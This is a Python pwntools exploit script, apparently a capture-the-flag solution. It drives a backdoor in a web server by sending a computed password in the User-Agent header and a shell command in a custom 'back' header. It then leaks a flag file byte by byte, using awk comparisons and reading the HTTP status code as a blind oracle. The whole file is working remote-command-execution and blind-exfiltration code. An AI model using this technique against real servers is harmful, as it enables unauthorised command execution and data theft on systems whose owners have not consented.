#!/usr/bin/env python

from pwn import *
import os

context.log_level = 21

def get_password():
    counter = 0
    password = ""
    for i in "2016CCRT":
        password += chr(ord(i) ^ counter)
        counter += 1
    return password

def get_payload(command, password):
    payload = ""
    payload += "GET / HTTP/1.1\r\n"
    payload += "User-Agent: %s\r\n" % (password)
    payload += "back: %s\r\n" % (command)
    payload += "\r\n"
    payload += "\r\n"
    return payload

def send_payload(payload):
    Io = remote(HOST, PORT)
    Io.sendline(payload)
    result = Io.read()
    Io.close()
    return result

def execute(command):
    payload = get_payload(command, PASSWORD)
    print "[+] Payload : %s" % (repr(payload))
    return send_payload(payload)
    
def guess_one_byte(index, char):
    command = "cat flag|awk '{if(substr($1,%d,1)>\"%s\") print \"%s\"}'" % (
        index + 1, char, "A")
    print "[+] Executing : [%s]" % (command)
    response = execute(command)
    return (response[len("HTTP/1.1 ")] != "5")

def clear_screen():
    os.system("clear")

def guess(LENGTH):
    flag = ""
    for i in range(LENGTH + 1):
        RIGHT = 0x7F
        LEFT = 0x20
        P = (LEFT + RIGHT) / 2
        while True:
            clear_screen()
            print "[+] Flag : [%s]" % (flag)
            if guess_one_byte(i, chr(P)):
                LEFT = P
            else:
                RIGHT = P
            P = (LEFT + RIGHT) / 2
            print abs(RIGHT - LEFT)
            if abs(RIGHT - LEFT) < 2:
            	flag += chr(P + 1)
                break
    clear_screen()
    print "[+] Flag : [%s]" % (flag)
    return flag

PASSWORD = get_password()

# DEBUG = True
DEBUG = False

if DEBUG:
    HOST = "localhost"
    PORT = 1807
else:
	HOST = "pwn.jarvisoj.com"
	PORT = 9881
LENGTH = 39
print guess(LENGTH)